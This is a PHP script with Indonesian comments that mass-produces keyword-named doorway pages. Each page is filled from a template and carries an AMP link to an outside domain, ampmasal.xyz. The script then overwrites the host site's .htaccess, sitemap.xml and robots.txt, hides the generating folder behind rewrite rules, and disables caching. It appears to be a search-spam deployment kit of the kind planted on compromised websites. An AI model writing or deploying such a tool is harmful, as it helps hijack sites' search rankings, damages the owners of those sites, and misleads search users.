<?php
// Error reporting
error_reporting(E_ALL);
ini_set('display_errors', 1);

// Konfigurasi dasar
$filename = "gas.txt";
$templateFile = "template.php";
$mainDir = "gas";
$successfulUrls = []; // Array untuk menyimpan URL yang berhasil

try {
    // Cek file yang diperlukan
    if (!file_exists($filename)) {
        throw new Exception("File '$filename' tidak ditemukan.");
    }
    if (!file_exists($templateFile)) {
        throw new Exception("File '$templateFile' tidak ditemukan.");
    }

    // Baca template
    $templateContent = file_get_contents($templateFile);
    if ($templateContent === false) {
        throw new Exception("Gagal membaca file template.");
    }

    // Buat direktori utama jika belum ada
    if (!is_dir($mainDir)) {
        if (!mkdir($mainDir, 0755)) {
            throw new Exception("Gagal membuat direktori '$mainDir'");
        }
    }

    // Baca keywords
    $lines = file($filename, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    if ($lines === false) {
        throw new Exception("Gagal membaca file keywords.");
    }

    // Setup domain
    $currentDomain = $_SERVER['HTTP_HOST'];

    foreach ($lines as $line) {
        // Proses setiap keyword
        $folderName = str_replace(' ', '-', trim($line));
        $folderPath = "$mainDir/$folderName";
        
        // URL setup
        $folderURL = "https://$currentDomain/$folderName";
        $ampURL = "https://ampmasal.xyz/$folderName";
        
        // Buat folder
        if (!is_dir($folderPath)) {
            if (!mkdir($folderPath, 0755, true)) {
                continue;
            }
        }

        // Proses template
        $customContent = str_replace(
            [
                '{{BRAND_NAME}}',
                '{{URL_PATH}}',
                '{{AMP_URL}}',
                '{{BRANDS_NAME}}'
            ],
            [
                strtoupper($folderName),
                $folderURL,
                $ampURL,
                strtolower($folderName)
            ],
            $templateContent
        );

        // Tulis file index.php
        $indexPath = "$folderPath/index.php";
        if (file_put_contents($indexPath, $customContent) !== false) {
            echo "🔗 <a href='$folderURL' target='_blank'>$folderURL</a><br>";
            $successfulUrls[] = $folderURL; // Simpan URL yang berhasil
        }
    }

    // Buat/Update .htaccess
    $htaccess = "RewriteEngine On\n";
    $htaccess .= "RewriteBase /\n\n";
    $htaccess .= "# Redirect from /gas/ URLs\n";
    $htaccess .= "RewriteCond %{THE_REQUEST} \s/+gas/([^\s]+) [NC]\n";
    $htaccess .= "RewriteRule ^ /%1 [R=301,L,NE]\n\n";
    $htaccess .= "# Internal rewrite\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-f\n";
    $htaccess .= "RewriteCond %{REQUEST_FILENAME} !-d\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} !^/gas/\n";
    $htaccess .= "RewriteRule ^([^/]+)/?$ gas/$1/ [L,PT]\n\n";
    $htaccess .= "# Prevent direct gas access\n";
    $htaccess .= "RewriteCond %{REQUEST_URI} ^/gas/\n";
    $htaccess .= "RewriteCond %{ENV:REDIRECT_STATUS} ^$\n";
    $htaccess .= "RewriteRule ^ - [F]\n\n";
    $htaccess .= "# Disable directory indexing\n";
    $htaccess .= "Options -Indexes\n\n";
    $htaccess .= "# Prevent caching\n";
    $htaccess .= "<IfModule mod_headers.c>\n";
    $htaccess .= "    Header set Cache-Control \"no-cache, no-store, must-revalidate\"\n";
    $htaccess .= "    Header set Pragma \"no-cache\"\n";
    $htaccess .= "    Header set Expires 0\n";
    $htaccess .= "</IfModule>";

    if (file_put_contents('.htaccess', $htaccess) === false) {
        throw new Exception("Gagal membuat file .htaccess");
    }

    // Buat sitemap.xml dengan format yang diminta
    $sitemap = '<?xml version="1.0" encoding="UTF-8"?>' . "\n";
    $sitemap .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . "\n";
    $sitemap .= '<!--' . "\n";
    $sitemap .= "Created with IncludeHelp XML Sitemap Generator\n";
    $sitemap .= "https://www.includehelp.com/tools/xml-sitemap-generator.aspx\n";
    $sitemap .= ' -->' . "\n";

    foreach ($successfulUrls as $url) {
        $sitemap .= "<url>\n";
        $sitemap .= "\t<loc>" . $url . "</loc>\n";
        $sitemap .= "\t<lastmod>" . date('Y-m-d') . "</lastmod>\n";
        $sitemap .= "\t<changefreq>weekly</changefreq>\n";
        $sitemap .= "\t<priority>1.0</priority>\n";
        $sitemap .= "</url>\n";
    }

    $sitemap .= "</urlset>";

    // Tulis sitemap.xml
    if (file_put_contents('sitemap.xml', $sitemap) !== false) {
        echo "<br>✅ Sitemap.xml berhasil dibuat<br>";
    }

    // Buat robots.txt
    $robotsContent = "User-agent: *\n";
    $robotsContent .= "Sitemap: https://" . $currentDomain . "/sitemap.xml";

    // Tulis robots.txt
    if (file_put_contents('robots.txt', $robotsContent) !== false) {
        echo "✅ Robots.txt berhasil dibuat<br>";
        // Set permission untuk robots.txt
        chmod('robots.txt', 0644);
    }

    echo "<br>Proses selesai.";

    // Set permission
    chmod('.htaccess', 0644);
    chmod($mainDir, 0755);
    chmod('sitemap.xml', 0644);

} catch (Exception $e) {
    echo "<h2>Error:</h2>";
    echo $e->getMessage();
    error_log("Create Folders Error: " . $e->getMessage());
}
?>
